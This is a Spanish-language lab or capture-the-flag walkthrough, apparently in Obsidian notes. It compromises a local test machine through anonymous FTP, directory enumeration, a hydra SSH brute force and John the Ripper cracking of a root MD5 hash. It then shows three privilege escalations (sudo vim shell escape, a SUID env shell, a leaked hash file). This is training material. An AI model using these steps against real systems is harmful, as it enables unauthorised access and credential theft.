1. Realizamos un [[00. Apuntes/01. Herramientas/NMAP|NMAP]] hacia la IP objetivo:
`nmap -p- -sS -sCV --min-rate 5000 -n -vvv -Pn <IP> -oN <NombreFichero>
![[Pasted image 20241117192910.png]]

2.  Vemos en el scaneo que esta permitida la entrada de FTP anonymous:
`ftp ftp@IP`
![[Pasted image 20241117193148.png]]

3. Nos descargamos todos los ficheros dentro de FTP:
`mget *`

- Leemos el archivo `chat-gonza.txt`
![[Pasted image 20241117193504.png]]

4.  Hace mención a una URL vamos a hacer una búsqueda de directorios y ficheros con [[00. Apuntes/01. Herramientas/GOBUSTER|GOBUSTER]]:
`gobuster dir -u <URL> -w <wordlist> -x <extensiones> -r`
- Encontramos los siguientes ficheros
![[Pasted image 20241117194514.png]]

5. Vamos a profundizar en `backup`
- Desde la web vemos que hay dentro un fichero llamdo `backup.txt`
- Leemos el contenido con curl
`curl http://172.17.0.2/backup/backup.txt`
![[Pasted image 20241117194908.png]]
- Ya hemos obtenido el usuario del sistema

6. Intrusión a la maquina [[HYDRA]]:
`hydra -l russoski -P <wordlist> ssh://IP`
![[Pasted image 20241117195235.png]]

7. Accedemos vía SSH:
`ssh russoski@IP`
![[Pasted image 20241117195435.png]]

8. Listamos el home del usuario
`ls -la`

- El fichero `.bash_history` no esta vacío así que lo leemos
- Viendo el fichero observamos que hay tres posibles formas de escalar privilegios

9.  Escalada de privilegios 1

- Nos movemos a `/var/www/html/important`

- Leemos el fichero `.root-passwd.txt`
![[Pasted image 20241117200133.png]]
- Copiamos el hash y creamos un fichero llamado hash

`echo aac0a9daa4185875786c9ed154f0dece > hash`

- Utilizamos la herramienta [[00. Apuntes/01. Herramientas/JOHN THE RIPPER|JOHN THE RIPPER]] para desencriptar el hash
`john --format=Raw-MD5  --wordlist=/usr/share/wordlists/rockyou.txt hash`
![[Pasted image 20241117200552.png]]

- Al obtener la clave la probamos con el usuario root y obtenemos el acceso

10. Escalada de privilegios 2
-  Usamos `sudo -l` para ver los comandos que podemos ejecutar como root
![[Pasted image 20241117200925.png]]

- Usamos `sudo vim -c ':!/bin/sh'` para obtener una `sh` como root
	- (Hemos buscado en [[GTFOBINS]] formas de escalar privilegios con vim)

11. Escalada privilegios 3
-  Buscaremos los binarios que tengan el permiso SUID activo
	- `find / -type f -perm -4000 2>/dev/null`
- Encontramos un binario llamado `env`
	- Buscando en [[GTFOBINS]] formas de escalar privilegios con `env` encontramos:
		- `/usr/bin/env /bin/sh -p` que nos permitirá una `sh` como root
